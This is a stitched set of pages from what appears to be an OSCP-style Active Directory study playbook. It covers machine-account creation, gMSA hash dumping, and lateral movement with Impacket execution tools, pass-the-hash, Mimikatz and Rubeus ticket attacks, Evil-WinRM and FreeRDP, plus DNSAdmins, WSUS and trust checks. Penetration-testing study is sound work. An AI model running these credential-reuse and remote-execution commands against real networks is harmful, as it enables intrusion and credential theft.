Read: successful binding proves that mapped identity's LDAP context, not domain administration. The same object ACL still governs group/password/delegation writes. Certificate trust/mapping, TLS policy or a missing private key can block this route. Do not weaken workstation-wide TLS settings to compensate for an unexplained failure.

Sources: [upstream 1](https://github.com/AlmondOffSec/PassTheCert/blob/main/Python/README.md).


## Powermad — create an account only when the chosen AD path needs it

Use from a suitable authenticated PowerShell context when the actual quota/delegation permits computer creation and the planned path needs an account/SPN you control. Account creation alone does not grant RBCD rights on another host.

```powershell
Import-Module .\Powermad.ps1
$machinePassword = ConvertTo-SecureString 'MACHINE_PASSWORD' -AsPlainText -Force
New-MachineAccount -MachineAccount NEWPC -Password $machinePassword `
  -Domain DOMAIN -DomainController DC_HOST
```

Read: verify the created account, its SPNs and the chosen target-object permission separately. Quota, OU ACLs and existing names can stop the operation. Standard create rights do not necessarily permit deleting the created account later; establish the cleanup route and avoid repeated throwaway account creation.

Sources: [upstream 1](https://github.com/Kevin-Robertson/Powermad).


## gMSA — obtain a decoded hash only with managed-password read rights

Use when the accepted directory identity has the managed-password read permission for the gMSA. NetExec selects LDAPS for this operation, so the DC's LDAP TLS path must work.

```bash
nxc ldap DC_IP -d DOMAIN -u USER -p 'PASSWORD' --gmsa

# After identifying the returned service account and hash, test one relevant service
nxc smb TARGET -d DOMAIN -u 'GMSA$' -H HASH --shares
```

Read: keep the exact service-account name and decoded NT hash together; an encoded `msDS-ManagedPassword` blob is a different representation. Authentication acceptance still does not prove administrative/remote-execution rights. Empty output → inspect object permissions, LDAPS, account type and collection errors before concluding that no gMSA path exists.

Sources: [upstream 1](https://www.netexec.wiki/ldap-protocol/dump-gmsa).


## Sources

- Supplied PEN-200, Chapter 23, especially the targeted Kerberoast, silver-ticket and DCSync sections.
- [OffSec OSCP+ Body of Knowledge](https://help.offsec.com/hc/en-us/articles/38543335188756-OSCP-Body-of-knowledge)
- [PowerSploit PowerView (archived)](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
- [getSH Active Directory: Object Permissions, AD CS, GPO Abuse and Domain Compromise](https://lizajose.github.io/getSH/ad), source snapshot [`e1f62dd`](https://github.com/lizajose/getSH/commit/e1f62dd351bd061b59e2573beea741f6c5bb4f98)
- [Certipy](https://github.com/ly4k/Certipy)
- [Impacket secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
- [SpecterOps AD CS research](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [Hexdump Active Directory modules](https://github.com/LeonardoE95/OSCP/tree/main/modules/active-directory)

# Lateral Movement [← Stage index](README.md) | [Identity transitions](03-kerberos-and-identity-transitions.md) | [Pivoting](../07-pivoting-tunneling/README.md) | [AD cheatsheet](../../cheatsheets/active-directory.md) | [Strategy map](../../notes/Attack_Strategy_Map.md) | Study methods: [Move to another host](../../notes/methods/lateral-movement.md) > **Selection rule:** credential type → accepted authentication protocol → reachable service → service-specific authorization → execution/session effect. > > **Exit:** verify the destination hostname, represented identity, token/rights and network state; then re-enumerate credentials, domain relationships, sessions and routes. ## 1. Choose by credential and service | Material | Compatible starting paths | Important boundary | | --- | --- | --- | | Password | SMB/SCM, WMI/DCOM, WinRM/WinRS, RDP | Correct password does not grant the required logon or execution right | | NT hash | NTLM-capable SMB/WMI/WinRM; RDP only through Restricted Admin where supported | Net-NTLM and DCC2 are not reusable NT hashes | | TGT/ccache | Kerberos-capable tool using target FQDN/SPN | Ticket identity, realm, lifetime, DNS and KDC route must match | | TGS | Only the named `SERVICE/HOST` and compatible client | A CIFS ticket does not authorize WinRM, WMI or RDP | | AES/NT long-term key | Request a TGT, then use Kerberos | RC4/NT-key requests can fail where RC4 is disabled | | Local-account password/hash | NTLM or RDP in the target's local account context | Remote UAC/account restrictions commonly filter non-RID-500 local administrators | | Reachable service | Common execution/access mechanisms | Usual authorization | | --- | --- | --- | | SMB 445 + SCM/RPC | PsExec, SMBExec, service creation | Administrative share plus SCM/service rights | | RPC endpoint mapper 135 + dynamic RPC; often SMB for output | WMIExec, native CIM/WMI, DCOM | Remote WMI/DCOM rights, commonly an effective administrator token | | Task Scheduler RPC plus SMB output | ATExec | Remote task creation and administrative output access | | WinRM 5985/5986 | WinRS, PowerShell remoting, Evil-WinRM | Enabled endpoint and endpoint/session authorization | | RDP 3389 | FreeRDP, MSTSC | Remote-interactive logon right; Restricted Admin requires administrator access | ## 2. Preflight from the actual source Directly routed source: ```bash nmap -Pn -sT -sV -p 135,139,445,3389,5985,5986 TARGET -oN movement-preflight.txt getent hosts TARGET_HOST date -u ``` Windows source: ```powershell Resolve-DnsName TARGET_HOST Test-NetConnection TARGET_HOST -Port 445 Test-NetConnection TARGET_HOST -Port 5985 Test-NetConnection TARGET_HOST -Port 3389 w32tm /query /status ``` Port 135 alone does not prove WMI/DCOM viability because RPC commonly negotiates a dynamic high port. When the destination is reachable only through a pivot, perform these checks through the established Block 13 route and respect the client/proxy's transport limits. Record: ```text SOURCE POSITION -> TARGET FQDN/IP -> ROUTE -> SERVICE/PORT -> CREDENTIAL TYPE -> LOCAL/DOMAIN IDENTITY -> EXPECTED RIGHT -> CHOSEN METHOD -> EXPECTED EFFECT ``` ## 3. Validate authentication separately from execution NetExec can classify a selected SMB credential: ```bash # Domain password nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' # Domain NT hash nxc smb TARGET -d DOMAIN -u USER -H NT_HASH # Target-local account nxc smb TARGET -u Administrator -H NT_HASH --local-auth # Prove only share access nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares ``` > A successful login proves SMB authentication. `(Pwn3d!)` is NetExec's SMB administrative-context indicator, not proof that WinRM, RDP, WMI or every SMB execution method will succeed. For one justified execution proof: ```bash nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' -x "hostname & whoami" --exec-method wmiexec ``` Current NetExec can select `wmiexec`, `atexec` or `smbexec`; without an explicit method it may fail over between them. Use a forced method when diagnosing prerequisites so the result remains attributable. ## 4. SMB and service-control execution ### Impacket PsExec ```bash # Password impacket-psexec 'DOMAIN/USER:PASSWORD@TARGET' # NT hash / Pass-the-Hash impacket-psexec -hashes :NT_HASH 'DOMAIN/USER@TARGET' ``` > **Need:** SMB 445/139, writable administrative share and Service Control Manager rights. Impacket uploads a RemCom service binary, creates/starts a service and communicates over named pipes. Verify the returned identity; the service context is commonly SYSTEM. Kerberos cache: ```bash export KRB5CCNAME="$PWD/USER.ccache" impacket-psexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'DOMAIN/USER@TARGET_HOST' ``` The target parameter uses the hostname matching the CIFS/HOST SPN; `-target-ip` separates connection routing from Kerberos naming. ### Sysinternals PsExec from Windows ```cmd PsExec64.exe -accepteula \\TARGET_HOST -u DOMAIN\USER -p PASSWORD cmd.exe ``` > The official PsExec binary is not built into Windows. It requires remote administrative access and creates the PSEXESVC service/artifacts. Avoid putting real passwords in retained shell history; an existing authorized network credential context is preferable. ### SMBExec ```bash impacket-smbexec 'DOMAIN/USER:PASSWORD@TARGET' impacket-smbexec -hashes :NT_HASH 'DOMAIN/USER@TARGET' ``` > SMBExec creates temporary services whose command lines redirect output through a share. It does not use the same uploaded RemCom binary as PsExec, but it still requires SCM/service rights and produces substantial service/event artifacts.
Kerberos and alternate output modes ```bash export KRB5CCNAME="$PWD/USER.ccache" impacket-smbexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'DOMAIN/USER@TARGET_HOST' # SHARE is default; SERVER starts a local SMB server and needs permission to bind locally. impacket-smbexec -mode SHARE -share C$ 'DOMAIN/USER:PASSWORD@TARGET' ```
### ATExec ```bash impacket-atexec 'DOMAIN/USER:PASSWORD@TARGET_HOST' "cmd.exe /c hostname & whoami" impacket-atexec -hashes :NT_HASH 'DOMAIN/USER@TARGET_HOST' "cmd.exe /c hostname & whoami" ``` > ATExec creates and deletes a scheduled task and normally retrieves output from `ADMIN$\Temp`. It is a one-shot command mechanism, not an interactive shell; task-scheduler RPC and administrative share access must both work. Kerberos: ```bash export KRB5CCNAME="$PWD/USER.ccache" impacket-atexec -k -no-pass -dc-ip DC_IP 'DOMAIN/USER@TARGET_HOST' "cmd.exe /c hostname & whoami" ``` ## 5. WMI and DCOM execution ### Impacket WMIExec ```bash impacket-wmiexec 'DOMAIN/USER:PASSWORD@TARGET' impacket-wmiexec -hashes :NT_HASH 'DOMAIN/USER@TARGET' ``` > WMIExec creates processes through WMI/DCOM. Its normal output channel uses SMB and defaults to `ADMIN$`; therefore a WMI process may run even when output retrieval fails. `-nooutput` or `-silentcommand` changes that evidence channel. Kerberos with separate name and route: ```bash export KRB5CCNAME="$PWD/USER.ccache" impacket-wmiexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'DOMAIN/USER@TARGET_HOST' ```
One command, no SMB output ```bash impacket-wmiexec -nooutput 'DOMAIN/USER:PASSWORD@TARGET' "cmd.exe /c echo MOVEMENT_OK > C:\Windows\Temp\movement-proof.txt" ``` Verify the harmless artifact through an independently authorized channel. No returned stdout is expected.
### Native PowerShell CIM over DCOM ```powershell $Credential = Get-Credential 'DOMAIN\USER' $Options = New-CimSessionOption -Protocol Dcom $Session = New-CimSession -ComputerName TARGET_HOST -Credential $Credential -SessionOption $Options Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = 'cmd.exe /c hostname > C:\Windows\Temp\movement-proof.txt' } Remove-CimSession $Session ``` > `ReturnValue = 0` and a process ID confirm process creation, not its final effect. WMI-created processes run in session 0; GUI programs will not appear on an interactive desktop. ### DCOM MMC method Current Windows token: ```powershell $Type = [type]::GetTypeFromProgID('MMC20.Application.1','TARGET_HOST') $Object = [Activator]::CreateInstance($Type) $Object.Document.ActiveView.ExecuteShellCommand( 'cmd.exe', $null, '/c hostname > C:\Windows\Temp\movement-proof.txt', '7' ) ``` Impacket with password or NT hash: ```bash impacket-dcomexec 'DOMAIN/USER:PASSWORD@TARGET' impacket-dcomexec -hashes :NT_HASH 'DOMAIN/USER@TARGET' ``` > Current Impacket `dcomexec` explicitly rejects Kerberos for its supported MMC/Shell DCOM objects because they do not accept the required HOST ticket. Use `wmiexec -k` when Kerberos command execution is required. DCOM class availability, RPC reachability and launch/access permissions vary. ## 6. WinRM, WinRS and PowerShell remoting ### Evil-WinRM ```bash # Password; omit -p to prompt where supported evil-winrm -i TARGET_HOST -u USER -p 'PASSWORD' # NT hash evil-winrm -i TARGET_HOST -u USER -H NT_HASH # HTTPS listener evil-winrm -i TARGET_HOST -u USER -p 'PASSWORD' -S -P 5986 ``` Current Evil-WinRM ticket-file support: ```bash evil-winrm -i TARGET_FQDN -r DOMAIN -K USER.ccache --spn HTTP ``` > **Need:** reachable 5985/5986, an enabled WinRM/PowerShell endpoint and endpoint authorization. The identity is commonly an administrator or a member of the applicable remote-management group, but endpoint SDDL/policy is decisive. Kerberos requires the FQDN/SPN, realm/KDC configuration and a compatible ticket. ### Native WinRS ```cmd winrs /r:TARGET_HOST /u:DOMAIN\USER /p:PASSWORD "cmd /c hostname & whoami" ``` To avoid retaining a password on the command line, use the current authorized Windows credential context where possible: ```cmd winrs /r:TARGET_HOST "cmd /c hostname & whoami" ``` > WinRS uses WinRM. A non-administrator can require `/noprofile` depending on endpoint configuration. `/allowdelegate` affects onward credential use and is not a default fix for the double-hop problem. ### PowerShell remoting ```powershell Test-WSMan TARGET_HOST $Credential = Get-Credential 'DOMAIN\USER' Invoke-Command -ComputerName TARGET_HOST -Credential $Credential -ScriptBlock { hostname whoami /all } $Session = New-PSSession -ComputerName TARGET_HOST -Credential $Credential Enter-PSSession -Session $Session ``` > A hostname normally supports Negotiate/Kerberos in a domain. An IP address requires explicit credentials and generally HTTPS or a tightly scoped TrustedHosts configuration. Do not weaken global TrustedHosts merely to hide DNS/SPN mistakes. ## 7. RDP Check the installed binary name: ```bash command -v xfreerdp3 || command -v xfreerdp ``` Password: ```bash xfreerdp3 /v:TARGET_HOST /d:DOMAIN /u:USER /p:'PASSWORD' /cert:ignore /dynamic-resolution +clipboard ``` Older packages may expose the same syntax through `xfreerdp`. NT hash: ```bash xfreerdp3 /v:TARGET_HOST /d:DOMAIN /u:USER /pth:NT_HASH /cert:ignore /dynamic-resolution ``` > FreeRDP's `/pth` uses Restricted Admin mode. The target must support/permit that mode and the identity must be an administrator; ordinary Remote Desktop Users membership is not sufficient for Restricted Admin. Password-based RDP instead needs the Remote Desktop service, NLA compatibility and the effective “Allow log on through Remote Desktop Services” right without a deny override. Native client: ```cmd mstsc.exe /v:TARGET_HOST mstsc.exe /restrictedAdmin /v:TARGET_HOST ``` Ordinary RDP can place reusable user credentials in the destination's LSASS. Restricted Admin avoids sending those reusable credentials but prevents ordinary onward access as that user; treat the resulting session's network identity separately. ## 8. Pass-the-Hash, Overpass-the-Hash and Pass-the-Ticket ### Pass-the-Hash ```text NT HASH -> NTLM CHALLENGE/RESPONSE -> TARGET SERVICE ``` PtH requires an NTLM-capable service, a valid account context and the service-specific right. SMB share access may work without administrative execution; PsExec/WMIExec/SMBExec usually need administrative rights. Remote UAC commonly filters non-built-in local administrators. Domain accounts in the target Administrators group traditionally receive a full remote token, but newer Administrator Protection policy can change that result—trust the observed target token and method-specific authorization. ### Overpass-the-Hash / key-to-ticket Mimikatz network-credential context: ```text sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:NT_HASH /run:powershell.exe ``` Rubeus TGT request: ```cmd Rubeus.exe asktgt /user:USER /domain:DOMAIN /rc4:NT_HASH /dc:DC_HOST /ptt klist ``` AES alternative: ```cmd Rubeus.exe asktgt /user:USER /domain:DOMAIN /aes256:AES256_KEY /dc:DC_HOST /ptt ``` Trigger a Kerberos service request with the hostname, then inspect: ```cmd dir \\TARGET_HOST\C$ klist ``` > In a Mimikatz `sekurlsa::pth` process, `whoami` can still show the original local process token while network authentication uses the supplied identity. Validate the ticket's client and the remote result rather than treating local `whoami` as the network identity. ### Pass-the-Ticket Windows: ```cmd Rubeus.exe ptt /ticket:ticket.kirbi klist ``` ```text kerberos::ptt ticket.kirbi ``` Linux: ```bash export KRB5CCNAME="$PWD/ticket.ccache" klist impacket-wmiexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'DOMAIN/USER@TARGET_HOST' ``` A TGS must name the selected service/hostname. A TGT can request a suitable TGS only while valid and when the KDC is reachable. Ticket import is not lateral movement until the destination accepts it and produces the intended authorized effect. ## 9. Local versus domain identity and remote UAC ```text DOMAIN\USER -> domain identity; evaluate target-local group/right TARGET\USER -> SAM identity on that target ./USER -> tool-specific local-account selection ``` Common failure pattern: 1. a local account authenticates over SMB; 2. Windows issues a filtered remote token; 3. `ADMIN$`, SCM or WMI administrative operations fail. Do not “fix” this by changing `LocalAccountTokenFilterPolicy` during an attack workflow. Use a method already permitted by the target's configuration, the built-in Administrator where legitimately obtained and applicable, RDP if authorized, or another mapped identity. ## 10. Output channels, session 0 and double hop Remote process creation, stdout retrieval and an interactive shell are separate states: ```text AUTHENTICATED -> REMOTE OPERATION AUTHORIZED -> PROCESS/TASK/SERVICE CREATED -> COMMAND EFFECT OCCURRED -> OUTPUT RETURNED OR CALLBACK CONNECTED -> USABLE SESSION ``` - PsExec returns named-pipe I/O through its service. - WMIExec normally redirects output to an SMB share. - SMBExec redirects command output while repeatedly creating services. - ATExec writes output under `ADMIN$\Temp`. - Native WMI/DCOM may return only a PID/return value; verify a harmless file or another bounded effect. - WMI/DCOM/service processes commonly run in session 0, so a GUI is not visible to the logged-on user. - WinRM creates a remote shell/runspace and returns structured or text output. A WinRM/PowerShell session on HOST_A may not possess delegable credentials for HOST_B. That “double hop” is a credential-context problem, not proof that HOST_B or the password is wrong. Prefer executing from the source that actually holds the credential/ticket rather than enabling broad delegation. ## 11. Failure router | Evidence | Layer | Next decision | | --- | --- | --- | | Timeout/refused | Route, firewall or listener | Verify from the actual source and account for RPC dynamic ports | | SMB login succeeds; `ADMIN$` denied | Share/admin token/UAC | Distinguish share authentication from effective administrator context | | `(Pwn3d!)` but forced method fails | Method-specific SCM/WMI/task prerequisite | Test only that method's RPC/service right and side effects | | `STATUS_LOGON_FAILURE` | Credential/domain/authentication | Correct local/domain context, artifact type and protocol | | `STATUS_ACCOUNT_RESTRICTION` or logon-type denial | Account policy/right | Check permitted logon type and deny overrides | | RPC server unavailable | 135/dynamic RPC/firewall/service | Validate endpoint mapper and negotiated port from source | | WMI return value nonzero | Process creation request failed | Decode return value; command effect is unconfirmed | | Process succeeds; output missing | Output channel, share or session-0 behavior | Use a bounded file/side-effect proof or compatible output option | | WinRM listener responds; shell denied | Endpoint SDDL/group/logon/UAC policy | Validate endpoint authorization, not merely credentials | | RDP NLA succeeds; logon denied | Remote-interactive right or deny policy | Verify Remote Desktop Users/Administrators and user-right assignment | | RDP `/pth` denied | Restricted Admin disabled/unsupported or user not admin | Do not equate ordinary RDP authorization with Restricted Admin | | `KDC_ERR_S_PRINCIPAL_UNKNOWN` | Hostname/SPN/realm | Use FQDN matching the ticket and correct realm | | `KRB_AP_ERR_MODIFIED` | SPN account/key mismatch | Confirm SPN owner, target alias and ticket key | | Clock-skew error | Time | Repair time before credential changes | | Kerberos tool uses IP and falls back/fails | Name/SPN selection | Separate `TARGET_HOST` from `TARGET_IP` | | First hop works; second hop denied | Credential delegation/double hop | Move execution to credential-holding source or use an explicit ticket | ## 12. After movement ```cmd hostname whoami /all ipconfig /all route print netstat -ano klist ``` Re-enumerate: 1. local privilege and accessible credential sources; 2. domain groups, ACLs, shares and host rights under the new identity; 3. logged-on sessions and service accounts; 4. interfaces, routes, DNS, listeners and internal reachability; 5. the next evidence-backed host/identity transition. Do not overwrite the earlier state. Record the source host, credential form, authentication protocol, execution method, returned identity and side effects. ## Tooling for this section | Tool | Choose it for | Needs | Baseline | Decisive output | Failure cue | | --- | --- | --- | --- | --- | --- | | Nmap/Test-NetConnection | Service reachability | Actual source route | Section 2 | Reachable named service | Direct test bypasses/ignores the pivot | | NetExec | Selected credential/admin-context validation | Supported protocol and credential | Section 3 | Exact identity plus method-specific admin cue | Auth success without execution right | | Impacket PsExec | Interactive SMB/SCM execution | Admin share + SCM | Section 4 | Remote shell/verified identity | Share/service creation denied | | Impacket SMBExec | Command shell without RemCom upload | SCM + output route | Section 4 | Command output | Service/output share failure | | Impacket ATExec | One-shot scheduled task | Task RPC + ADMIN$ output | Section 4 | Retrieved command output | Task created but output unavailable | | Impacket WMIExec | WMI process creation with password/hash/ticket | RPC/DCOM; SMB unless no-output | Section 5 | Shell/output or verified effect | RPC works but share/output fails | | Impacket DCOMExec | NTLM password/hash DCOM objects | RPC/DCOM and supported object | Section 5 | Verified command effect | Kerberos deliberately unsupported | | Evil-WinRM | Interactive WinRM/PSRP | Endpoint authorization | Section 6 | Remote PowerShell prompt | Listener present but endpoint rejects | | WinRS/PowerShell remoting | Built-in Windows management | WinRM and token/credential | Section 6 | Remote hostname/identity | IP trust or double-hop issue | | FreeRDP/MSTSC | GUI/remote-interactive session | RDP right/NLA; admin for Restricted Admin | Section 7 | Usable desktop with verified identity | Auth accepted but logon type denied | | Rubeus/Mimikatz/klist | Key/ticket context | Correct key/ticket/logon session | Section 8 | Expected TGT/TGS client and service | Local token confused with network identity | Package names vary: current Kali-style Impacket commands commonly use the `impacket-` prefix, and FreeRDP 3 packages may expose `xfreerdp3` while older packages use `xfreerdp`. Inspect local `-h` output before use. ## winexe — Samba-side service execution alternative Use when the chosen account has working SMB authentication and effective remote service-control/administrative rights. This is a service-execution transport, not a credential bypass. ```bash # Prompts for the accepted identity's password winexe -U 'DOMAIN/USER' //TARGET 'cmd.exe /c whoami' ``` Read: verify the returned identity and destination. Access denied after a successful login points to authorization/UAC/service-control conditions; it does not justify guessing more passwords. Service creation and resulting artifacts require the same cleanup discipline as the other SMB execution methods. Prefer the existing supported Impacket/NetExec method when this legacy client is unavailable or incompatible. Sources: [upstream 1](https://www.kali.org/tools/winexe/). ## Sources - Supplied PEN-200, Chapter 24 pp786–804 for WMI/CIM, WinRS/WinRM, PsExec, PtH, Overpass-the-Hash, Pass-the-Ticket and DCOM. - [OffSec OSCP+ Body of Knowledge](https://help.offsec.com/hc/en-us/articles/38543335188756-OSCP-Body-of-knowledge) - [Impacket psexec](https://github.com/fortra/impacket/blob/master/examples/psexec.py), [smbexec](https://github.com/fortra/impacket/blob/master/examples/smbexec.py), [wmiexec](https://github.com/fortra/impacket/blob/master/examples/wmiexec.py), [atexec](https://github.com/fortra/impacket/blob/master/examples/atexec.py) and [dcomexec](https://github.com/fortra/impacket/blob/master/examples/dcomexec.py) - [NetExec command execution](https://www.netexec.wiki/smb-protocol/command-execution/execute-remote-command) and [local authentication](https://www.netexec.wiki/smb-protocol/authentication/checking-credentials-local) - [Microsoft WinRS](https://learn.microsoft.com/windows-server/administration/windows-commands/winrs), [PowerShell remoting](https://learn.microsoft.com/powershell/scripting/learn/remoting/running-remote-commands), [CIM DCOM options](https://learn.microsoft.com/powershell/module/cimcmdlets/new-cimsessionoption) - [Microsoft remote UAC behavior](https://learn.microsoft.com/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction), [Administrator Protection](https://learn.microsoft.com/windows/security/application-security/application-control/administrator-protection/) and [Remote Credential Guard/Restricted Admin](https://learn.microsoft.com/windows/security/identity-protection/remote-credential-guard) - [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) and [FreeRDP command-line source](https://github.com/FreeRDP/FreeRDP/blob/master/client/common/cmdline.h) - [getSH Active Directory route](https://lizajose.github.io/getSH/ad), source snapshot [`e1f62dd`](https://github.com/lizajose/getSH/commit/e1f62dd351bd061b59e2573beea741f6c5bb4f98) - [Hexdump Active Directory module](https://github.com/LeonardoE95/OSCP/tree/main/modules/active-directory) and [consolidated cheatsheet](https://github.com/LeonardoE95/OSCP/blob/main/cheatsheet.org). The live AD module remains a TODO; only its concise RDP/SMB cues were used and independently checked.

# Conditional AD infrastructure and trust checks

[Stage index](README.md) | [Complete task index](../INDEX.md) | [Object control and delegation](04-object-control-adcs-and-domain-compromise.md) | [Lateral movement](05-lateral-movement.md)

Use these checks when host or directory evidence identifies the feature. They identify the next prerequisite to investigate; they are not complete exploitation recipes for every product or version.

## DNSAdmins: distinguish DNS configuration from a service trigger

```powershell
# Domain-joined source with the RSAT AD module and readable group membership
Get-ADGroupMember -Identity DnsAdmins -Recursive
```

```cmd
:: Service queries use the current identity and can be denied separately
sc.exe \\DC_HOST qc DNS
sc.exe \\DC_HOST sdshow DNS
```

> **Read → next:** resolve whether the controlled identity really has DNS-server configuration rights, which server runs DNS, its service identity, and whether a usable plugin/configuration operation and restart trigger exist on that build. Group membership alone does not prove immediate execution or restart rights. Follow the [service-control permission workflow](../05-local-privilege-escalation/02-windows-privilege-escalation.md#4-service-control-and-executed-objects). A DNS restart on a DC can interrupt the domain; do not use it as a discovery probe.

## WSUS: identify the update authority from the current client

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate /v WUStatusServer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer
```

> **Read → next:** record the actual server URL, port, TLS and client policy. A client configured for WSUS does not grant update approval, content/signing control or server administration. Investigate server access and the exact privileged update consumer only after those rights are established. Missing registry values can mean another policy/configuration source; they do not prove the organization has no WSUS.

## Configuration Manager / SCCM: recognize the client before choosing a server-side path

```powershell
Get-Service CcmExec -ErrorAction SilentlyContinue
Get-CimInstance -Namespace root\ccm -ClassName SMS_Client
```

> **Read → next:** `CcmExec`/`SMS_Client` identifies a client context. It does not prove site-server access, SMS Provider authorization, deployment rights, accessible network-access-account credentials or permission to execute CMPivot. Record the site/management point from readable client configuration and test only the matching authenticated interface. Namespace absent and access denied are different outcomes. This reference does not yet contain a complete SCCM compromise procedure.

## Trusts: inspect the boundary before treating another domain as reachable privilege

```cmd
nltest /domain_trusts /all_trusts
```

```powershell
# RSAT alternative; query the domain in the current authenticated context
Get-ADTrust -Filter * -Properties * |
    Format-List Name,Direction,TrustType,ForestTransitive,SelectiveAuthentication,SIDFilteringForestAware,SIDFilteringQuarantined
```

> **Read → next:** keep trust direction, same-forest versus cross-forest scope, SID filtering, selective authentication, target SPN and the accepted identity separate. A trust object or child-domain admin does not by itself prove a usable forest-compromise chain. Verify name resolution, service reachability and authorization in the destination using the [movement preflight](05-lateral-movement.md#2-preflight-from-the-actual-source). Trust-key/SID-history forgery and cross-forest coercion are specialized paths, not complete procedures in this playbook.

## Sources

- [Microsoft: dnscmd](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dnscmd)
- [Microsoft: update-management troubleshooting](https://learn.microsoft.com/en-us/troubleshoot/mem/configmgr/update-management/troubleshoot-software-update-management)
- [Microsoft: Configuration Manager WMI programming](https://learn.microsoft.com/en-us/intune/configmgr/develop/core/clients/programming/about-configuration-manager-wmi-programming)
- [Microsoft: Get-ADTrust](https://learn.microsoft.com/en-us/powershell/module/activedirectory/get-adtrust)

pages.markdown:
# Stage 06: Active Directory and Lateral Movement

[← Main index](../../README.md) | [AD cheatsheet](../../cheatsheets/active-directory.md) | [Master Notes](../../notes/Master_Notes.md) | [Strategy map](../../notes/Attack_Strategy_Map.md) | Study methods: [Recover and use authentication material](../../notes/methods/credentials.md); [Map Active Directory attack paths](../../notes/methods/ad-mapping.md); [Gain a more useful domain identity](../../notes/methods/ad-identities.md); [Move to another host](../../notes/methods/lateral-movement.md)

> **Reasoning chain:** Identity → Group → Rights → Host Access → Session/Credential → New Identity → Higher Privilege. Validate each edge and route; BloodHound proposes paths but does not prove them.

[Focused AD investigation guide](../../notes/ad-investigation/README.md) — where to look, expected behavior, annotated synthetic observations and the next prerequisite to validate. [Investigation command chooser](../../cheatsheets/ad-investigation.md).

| Task | Open |
| --- | --- |
| Identify the domain, objects, rights, shares, sessions and candidate paths | [Domain mapping](01-domain-mapping.md) |
| Recover credentials/tickets from an already controlled host when privileges permit | [Credential access](02-credential-access.md) |
| AS-REP roast, Kerberoast, password validation and ticket transitions | [Kerberos and identity transitions](03-kerberos-and-identity-transitions.md) |
| Convert validated user/group/SPN/DACL rights and domain-replication rights; branch to AD CS/GPO/delegation only when evidence selects them | [Object control and domain compromise](04-object-control-adcs-and-domain-compromise.md) |
| Match password/hash/ticket to a reachable remote service | [Lateral movement](05-lateral-movement.md) |

## Generic worked chain

1. A supplied low-privilege domain identity authenticates to LDAP and SMB.
2. Native/LDAP/PowerView collection identifies computers, groups, SPNs, shares and ACL candidates.
3. BloodHound suggests that the identity can control a group whose members administer an application server; manual checks validate both the directory right and host authorization.
4. A remote session exposes an application configuration credential. Its identity/context is validated before reuse.
5. The new identity has a roastable service account or a validated remote-management path to another host.
6. A higher-privileged session produces a new credential/ticket or reveals replication rights.
7. Every identity/host/route transition triggers re-enumeration and evidence capture.

This is a reasoning example, not a target solution or claim of practical completion.

> **Exit condition:** the chosen relationship has been validated through compatible authentication and authorization, the new host/identity is verified, and the environment is re-enumerated from the new state.

- [Conditional infrastructure and trusts](06-conditional-infrastructure-and-trusts.md): DNSAdmins, WSUS, SCCM and trust-boundary checks.

- Diagrams: [AD capability transitions](01-domain-mapping.md#ad-capability-transitions) before mapping; [credential routing](02-credential-access.md#credential-routing) before credential classification.
